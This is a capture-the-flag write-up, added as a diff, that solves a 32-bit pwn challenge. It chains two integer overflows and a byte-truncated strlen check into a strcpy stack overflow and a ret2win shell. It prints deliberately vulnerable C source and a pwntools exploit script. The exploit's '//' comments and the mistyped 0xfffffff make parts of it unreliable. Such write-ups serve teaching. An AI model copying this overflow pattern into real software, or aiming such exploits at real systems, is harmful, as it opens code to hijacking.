@@ -1,0 +1,256 @@
+title: Quizz
+id: 1087
+category: Pwn
+difficulty: Medium
+content: |
+  **Author** : [aDHIxx](https://twitter.com/_aDHIxx_)
+
+  #### Initial Analysis
+
+  The challenges has three questions that needs to be answered. The initial questions are integer overflow and the third question is integer overflow that triggers a buffer overflow vulnerability .
+
+  * Initial steps to analyize the binary
+
+  ![](https://i.imgur.com/jDWKV1k.png)
+
+
+  ![](https://i.imgur.com/xv8NeS5.png)
+
+  ![](https://i.imgur.com/LzsBzqp.png)
+
+  Conclusions from initial check::
+  1. 32 - bit binary 
+  2. Not stripped
+  3.  All migitations are disabled
+  4. The presence of `win` function that can get us a shell.
+
+
+
+  * Source code
+  ```c=
+  //gcc chall.c -o chall -no-pie -fno-stack-protector -m32
+
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <unistd.h>
+  #include <string.h>
+
+  void win()
+  {
+     execve("/bin/sh",0,0);
+  }
+
+  int quiz1()
+  {
+      int inps= 0;
+      scanf("%d", &inps);
+      unsigned int integer = 4294967295;
+      int y= integer+inps;
+      if(y==0)
+      {
+          return 1;
+      }
+      else
+      {
+          return 0;
+      }
+  }
+
+  int quiz2()
+  {
+      int inps= 0;
+      scanf("%d", &inps);
+      int num = 16;
+      num=num * inps;
+      if((inps!=0)&&(num==0))
+      {
+          return 1;
+      }
+      else
+      {
+          return 0;
+      }
+  }
+
+  void quiz3(char *inp)
+  {
+     char inp_buf[23];
+     unsigned char inp_len = strlen(inp);
+
+     if(inp_len ==6)
+     {  
+          printf("You have quizzed the master.\n");
+          strcpy(inp_buf, inp);       
+     }
+     else
+     {
+          printf("Welpss. The solider went down on the last question!\n");
+     }
+  }
+
+  int main(){
+      init();
+      printf("There are 3 questions! Input the 3 answers. :)\n\n");
+      printf("\n------------------------\n");
+      printf("   WELCOME TO INT_QUIZ  \n");
+      printf("------------------------\n");
+      printf("Answer three easy integer questions and take away the flag!\n");
+      printf("Beware tho. Machines don't think like humans; if you know what i mean ;)\n");
+      printf("So let's get started.\n\n");
+      printf("Answer your first questions below :-");    
+
+
+      int x= quiz1();
+      if(x==1){
+      printf("\n------------------------------\n");
+      printf("  WOOHOO! ONE DOWN ! 2 TO GO  \n");
+      printf("------------------------------\n");
+      printf("\nAnswer your second questions below :- ");    
+
+
+   
+      int y= quiz2();
+      if(y==1){
+      printf("\n--------------------------------\n");
+      printf("  GETTING CLOSER!! JUST 1 MORE  \n");
+      printf("--------------------------------\n");
+      printf("\nAnswer your third questions below :- ");  
+
+
+      char *third;
+      scanf("%s",third);
+      quiz3(third);
+      }
+      return 0;
+      
+  }
+  }
+
+  ```
+  #### Integer overflow
+
+  When the result of an integer operation does not fit inside the allotted memory space, it is referred to as an integer overflow. Rather than a small error in program, it should be considered as a bug that can be exploited to alter the course of normal exceution of program.
+
+  #### quiz1
+
+  ```c=
+  int quiz1()
+  {
+      int inps= 0;
+      scanf("%d", &inps);
+      unsigned int integer = 4294967295;
+      int y= integer+inps;
+      if(y==0)
+      {
+          return 1;
+      }
+      else{
+          return 0;
+      }
+  }
+  ```
+  On analysing the source code, one would understand that we have to somehow find a number that when added to `4294967295` would give us `0`.
+  The basic common sense would be to give `-4294967295` as input. But doing it would result in error.
+
+
+  ![](https://i.imgur.com/VGN4sB9.png)
+
+
+  This is because in C language the range that is reserved for storing the int [data type] is `-2147483648` to `2147483647`. So, giving `-4294967295`, won't work.
+
+  So moving onto our question,this question has the most classic example of integer overflow. 
+
+
+  The range of values that can be stored for an unsigned integer in 4 bytes is `0` to `4294967295[0xfffffff]`.
+
+  | Data type | byte | range |
+  | -------- | -------- | -------- |
+  | unsigned int     | 4    | 0 - 4294967295     |
+
+  So if u add `1` to it, it wouldn't become `4294967296`, instead would result in an overflow ::`1 + 0xfffffff = 0x100000000`. But the additional bit is disregarded, thus resulting in 0.
+
+  ![](https://i.imgur.com/tzuU3qI.png)
+
+  #### quiz2
+
+  ```c=
+  int quiz2()
+  {
+      int inps= 0;
+      scanf("%d", &inps);
+      int num = 16;
+      num=num * inps;
+      if((inps!=0)&&(num==0))
+      {
+          return 1;
+      }
+      else
+      {
+          return 0;
+      }
+  }
+  ```
+  On analysing the code one would understand that we have to find a number that when multiplied with 16 would give me `0` but shouldn't be `0` itself.
+  As said before the range of signed integer is from `-2147483648` to `2147483647`, so we can give `268435456` .
+  ![](https://i.imgur.com/G0dvPsn.png)
+
+  #### quiz3
+
+  From main()
+  ```c=
+  char *third;
+      scanf("%s",third);
+      quiz3(third);}
+  ```
+  ```c=
+  void quiz3(char *inp)
+  {
+     char inp_buf[23];
+     unsigned char inp_len = strlen(inp);
+
+     if(inp_len ==6)
+     {  
+          printf("You have quizzed the master.\n");
+          strcpy(inp_buf, inp);       
+     }
+     else
+     {
+          printf("Welpss. The solider went down on the last question!\n");
+     }
+  }
+  ```
+  On analysing the code,one can see that the length of the input is being checked. Only if it is equal to `6`, one can reach the buffer overflow vulnerability that is present in `strcpy`. On overflowing,we get code execution so we can do a ret2win and that would give us a shell.
+  ![](https://i.imgur.com/PDogwAa.png)
+
+  But if we were to give an input with length `6`, we wouldn't be able to overflow since the array is of size 23.
+
+  Now we need to find the vulnerability in any functions in quiz3 using which we can somehow overcome the length barrier. The bug is that the result of `strlen(input)` is converted to a byte. So here if we were to give `0x106`, then `strlen` will return `0x06`, thus passing the length constraint.
+
+  Now we can give an input of length `0x106` and in that input we could overflow the variable `inp_buff[23]` and ret2win.
+
+  Now we need to get the buffer value and address of `win` function.
+
+
+  Now putting all of this together, we get the exploit as::
+
+  ```py=
+  from pwn import *
+
+  binary_path = './chall'
+  p = process([binary_path])
+
+  win_addr = 0x080492e4 //address of win from gdb
+  payload =b"A"*36   // 36 is the buffer value
+
+  payload += p32(win_addr) 
+  payload +=b"1"*(0x106 - len(payload)) //padding
+
+  p.recvuntil(b':-')
+  p.sendline(b'1')
+  p.recvuntil(b':-')
+  p.sendline(b'268435456')
+  p.recvuntil(b':-')
+  p.sendline(payload)
+  p.interactive()
+  ```
+  ![](https://i.imgur.com/gdkbWJD.png)
